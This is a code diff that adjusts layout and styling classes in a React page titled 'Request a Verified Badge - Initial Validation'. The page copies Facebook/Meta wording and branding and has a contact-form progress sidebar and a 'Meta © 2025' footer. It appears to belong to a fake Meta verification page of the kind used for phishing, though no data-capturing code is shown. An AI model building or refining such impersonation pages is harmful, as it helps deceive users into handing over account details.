@@ -66,11 +66,11 @@ export default function Validation() {
       />
       <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />
 
-      <div className="min-h-screen flex">
+      <div className="h-screen flex">
         {/* Desktop Sidebar */}
         {!isMobile && (
           <div className="w-64 bg-white border-r border-gray-200 hidden lg:block">
-            <div className="p-4">
+            <div className="h-full p-4">
               <h1 className="text-xl font-bold text-gray-900">Contact Form</h1>
               <div className="mt-8 space-y-4">
                 <p className="text-gray-700 font-semibold">Progress</p>
@@ -95,13 +95,13 @@ export default function Validation() {
 
         {/* Main Content */}
         <div className="flex-1 flex flex-col bg-white">
-          <div className="flex-1 flex justify-center p-4 sm:p-8">
-            <div className="max-w-2xl w-full space-y-4 sm:space-y-6">
-              <h1 className="text-xl sm:text-2xl font-bold text-gray-900">
+          <div className="h-[calc(100vh-40px)] flex justify-center px-4 py-4 bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
+            <div className="max-w-2xl w-full space-y-4">
+              <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
                 Request a Verified Badge - Initial Validation
               </h1>
 
-              <div className="space-y-3 sm:space-y-4 text-gray-600 text-sm sm:text-base">
+              <div className="space-y-3 text-gray-600 text-sm sm:text-base">
                 <p>
                   The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
                 </p>
@@ -113,7 +113,7 @@ export default function Validation() {
                 </p>
               </div>
 
-              <div className="bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4">
+              <div className="bg-[#F0F2F5] p-4 rounded-lg space-y-4">
                 <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Detailed Video Guide</h2>
 
                 <div className="video-container relative w-full aspect-video rounded-lg overflow-hidden bg-black">
@@ -195,7 +195,7 @@ export default function Validation() {
             </div>
           </div>
 
-          <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-gray-500 border-t">
+          <div className="h-10 text-center p-2 text-xs sm:text-sm text-gray-500 border-t">
             Meta © 2025
           </div>
         </div>
